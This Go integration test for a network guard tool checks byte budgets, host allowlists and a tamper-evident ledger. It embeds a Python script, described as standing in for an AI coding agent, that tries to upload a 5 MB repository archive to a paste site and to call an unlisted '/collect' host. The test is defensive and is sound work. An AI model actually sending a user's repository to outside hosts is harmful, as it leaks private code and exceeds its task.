// Copyright VPNW.com 2026
// SPDX-License-Identifier: Apache-2.0

package integration

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
)

// uploadServer takes HTTP requests and counts the body bytes that reach it,
// over all connections.
type uploadServer struct {
	port  int
	body  atomic.Int64
	mu    sync.Mutex
	paths []string
}

func newUploadServer(t *testing.T, addr string) *uploadServer {
	t.Helper()
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	s := &uploadServer{port: ln.Addr().(*net.TCPAddr).Port}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				defer c.Close()
				br := bufio.NewReader(c)
				first, _ := br.ReadString('\n')
				n := 0
				for {
					l, err := br.ReadString('\n')
					if err != nil || l == "\r\n" {
						break
					}
					if k, v, ok := strings.Cut(l, ":"); ok && strings.EqualFold(k, "Content-Length") {
						n, _ = strconv.Atoi(strings.TrimSpace(v))
					}
				}
				if f := strings.Fields(first); len(f) > 1 {
					s.mu.Lock()
					s.paths = append(s.paths, f[1])
					s.mu.Unlock()
				}
				got, _ := io.CopyN(io.Discard, br, int64(n))
				s.body.Add(got)
				body := `{"ok":true}`
				fmt.Fprintf(c, "HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", len(body), body)
			}(c)
		}
	}()
	t.Cleanup(func() { ln.Close() })
	return s
}

// agentScript stands in for an AI coding agent: it calls its model API, then
// tries to send a 5 MB archive of the repository to a paste site, twice, and
// then to a host nobody listed.
const agentScript = `import urllib.request as u, sys, os
api, paste, other = sys.argv[1:4]
def say(s):
    sys.stdout.write(s + "\n"); sys.stdout.flush()
for i in range(3):
    try:
        u.urlopen(api + "/v1/messages", timeout=5).read(); say("api %d ok" % (i + 1))
    except Exception as e:
        say("api %d FAILED %s" % (i + 1, type(e).__name__))
repo = os.urandom(5000000)
for i in (1, 2):
    try:
        u.urlopen(u.Request(paste + "/upload", data=repo, method="POST"), timeout=15).read(); say("upload %d ok" % i)
    except Exception as e:
        say("upload %d FAILED %s" % (i, type(e).__name__))
try:
    u.urlopen(other + "/collect", timeout=5).read(); say("other ok")
except Exception as e:
    say("other FAILED %s" % type(e).__name__)
`

var budgetRows []string

func budgetRecord(check, want, got string, ok bool) {
	res := "passed"
	if !ok {
		res = "FAILED"
	}
	budgetRows = append(budgetRows, fmt.Sprintf("| %s | %s | %s | %s |", check, want, got, res))
}

// An agent session under the Budget plugin: its API calls go through, its
// upload to an allowed host is cut at that host's byte budget and the next
// one refused, a host that isn't listed is refused; the console says so,
// the ledger seals the cut, and the ledger checks out.
func TestBudgetAgentSession(t *testing.T) {
	skipIfNoSeal(t)
	e := newEnv(t)
	api := newUploadServer(t, "127.0.0.1:0")
	paste := newUploadServer(t, "127.0.0.1:0")
	other := newUploadServer(t, "127.0.0.2:0")
	script := writeFile(t, e.dir, "agent.py", agentScript)
	led := filepath.Join(e.dir, "agent.ledger")
	tr := filepath.Join(e.dir, "agent.jsonl")
	allow := fmt.Sprintf("localhost down=10MB requests=20; 127.0.0.1 up=256KiB")
	args := []string{"guard", "--allow", "localhost", "--allow", "127.0.0.1", "--allow", "127.0.0.2", "--default", "deny",
		"--plugin", "budget", "--set", "budget.allow=" + allow,
		"--plugin", "ledger", "--plugin-file", "ledger=" + led, "--out", tr, "--no-deny-exit",
		"--", "python3", script,
		fmt.Sprintf("http://localhost:%d", api.port), fmt.Sprintf("http://127.0.0.1:%d", paste.port), fmt.Sprintf("http://127.0.0.2:%d", other.port)}
	out, code := e.run(args...)
	lines := strings.Split(strings.TrimSpace(out), "\n")
	has := func(s string) bool {
		for _, l := range lines {
			if strings.Contains(l, s) {
				return true
			}
		}
		return false
	}

	ok := has("api 1 ok") && has("api 2 ok") && has("api 3 ok")
	budgetRecord("the agent calls its API 3 times (localhost, 10 MB down, 20 connections)", "all 3 go through",
		fmt.Sprintf("api ok: %v", ok), ok)

	sent := paste.body.Load()
	var cut map[string]any
	var cutConn float64
	var closeUp float64
	for _, ev := range readTrace(t, tr) {
		switch ev["type"] {
		case "connection.cut":
			cut = fields(ev)
			cutConn, _ = ev["conn"].(float64)
		}
	}
	for _, ev := range readTrace(t, tr) {
		if ev["type"] == "connection.close" && ev["conn"] == cutConn {
			closeUp, _ = fields(ev)["bytes_up"].(float64)
		}
	}
	ok = has("upload 1 FAILED") && cut != nil && cut["limit"] == "up" && cut["rule"] == "plugin:budget" && int(closeUp) == 256*1024 && sent < 256*1024
	budgetRecord("it sends a 5 MB archive to the paste site (127.0.0.1, 256 KiB up)", "cut at the budget: no more than 256 KiB leaves, the rest never does; the record says why",
		fmt.Sprintf("upload failed: %v; bytes that left, request head included: %d; body bytes the site got: %d of 5,000,000; connection.cut: %v %v", has("upload 1 FAILED"), int(closeUp), sent, cut["limit"], cut["reason"]), ok)
	if !ok {
		t.Errorf("upload 1: cut %v closeUp %v sent %d\n%s", cut, closeUp, sent, out)
	}

	var denies []string
	for _, ev := range readTrace(t, tr) {
		if ev["type"] == "policy.deny" {
			f := fields(ev)
			denies = append(denies, fmt.Sprint(f["rule"], ": ", f["reason"]))
		}
	}
	spent, unlisted := false, false
	for _, d := range denies {
		spent = spent || strings.HasPrefix(d, "plugin:budget: byte budget spent: 256 KiB sent")
		unlisted = unlisted || d == "plugin:budget: 127.0.0.2 is not on the budget allowlist"
	}
	ok = has("upload 2 FAILED") && spent && paste.body.Load() == sent
	budgetRecord("it tries the upload again", "refused before anything is sent: the budget is spent", fmt.Sprintf("upload refused: %v, by %q", spent, firstWith(denies, "spent")), ok)
	if !ok {
		t.Errorf("upload 2: %v\n%s", denies, out)
	}
	ok = has("other FAILED") && unlisted && other.body.Load() == 0 && len(other.paths) == 0
	budgetRecord("it sends to a host nobody listed (127.0.0.2)", "refused; nothing reaches it", fmt.Sprintf("refused: %v, by %q; requests that reached it: %d", unlisted, firstWith(denies, "allowlist"), len(other.paths)), ok)
	if !ok {
		t.Errorf("other: %v\n%s", denies, out)
	}

	ok = has("CUT    127.0.0.1:") && has("sent 256 KiB, the budget")
	budgetRecord("the console", "a CUT line naming the host and the budget", firstLine(lines, "CUT "), ok)
	if !ok {
		t.Errorf("console:\n%s", out)
	}

	// The ledger seals the cut like every other event, and checks out.
	b, _ := os.ReadFile(led)
	var cutLine string
	for _, l := range strings.Split(string(b), "\n") {
		if strings.Contains(l, `"connection.cut"`) {
			cutLine = l
		}
	}
	got, vcode := e.run("verify", led, tr)
	verdict := strings.SplitN(strings.TrimSpace(got), "\n", 2)[0]
	ok = cutLine != "" && vcode == 0 && strings.HasPrefix(got, "intact: ")
	budgetRecord("the ledger", "holds the cut, sealed in its chain; vpnw verify says intact", fmt.Sprintf("connection.cut sealed: %v; verify: %s", cutLine != "", verdict), ok)
	if !ok {
		t.Errorf("ledger: %q verify %d\n%s", cutLine, vcode, got)
	}
	// And an edit to the cut line is caught.
	bad := filepath.Join(e.dir, "edited.ledger")
	os.WriteFile(bad, []byte(strings.Replace(string(b), `"limit":"up"`, `"limit":"down"`, 1)), 0o600)
	got2, vcode2 := e.run("verify", bad, tr)
	ok = vcode2 == 1 && strings.Contains(got2, "CHANGED: ")
	budgetRecord("the same ledger with the cut's direction edited", "vpnw verify names the changed line", firstLine(strings.Split(got2, "\n"), "CHANGED"), ok)
	if !ok {
		t.Errorf("edited ledger: exit %d\n%s", vcode2, got2)
	}
	if code != 0 {
		t.Errorf("guard exit %d\n%s", code, out)
	}

	if fn := os.Getenv("VPNW_BUDGET_OUT"); fn != "" {
		var sb strings.Builder
		sb.WriteString("| Step | What must happen | What happened | Result |\n|---|---|---|---|\n")
		sb.WriteString(strings.Join(budgetRows, "\n") + "\n\n")
		sb.WriteString("Budget: `" + allow + "` (127.0.0.2 isn't listed)\n\n")
		sb.WriteString("The console:\n\n```\n")
		ts := regexp.MustCompile(`^vpnw \d\d:\d\d:\d\d\.\d{3}  `)
		for _, l := range lines {
			sb.WriteString(ts.ReplaceAllString(l, "vpnw ") + "\n")
		}
		sb.WriteString("```\n\nThe cut, as the ledger sealed it:\n\n```\n" + cutLine + "\n```\n")
		os.WriteFile(fn, []byte(strings.ReplaceAll(sb.String(), e.dir+"/", "")), 0o644)
	}
}

func firstWith(list []string, s string) string {
	for _, x := range list {
		if strings.Contains(x, s) {
			return x
		}
	}
	return ""
}

func firstLine(lines []string, s string) string {
	for _, l := range lines {
		if strings.Contains(l, s) {
			return strings.TrimSpace(regexp.MustCompile(`^vpnw \d\d:\d\d:\d\d\.\d{3}\s+`).ReplaceAllString(l, ""))
		}
	}
	return ""
}
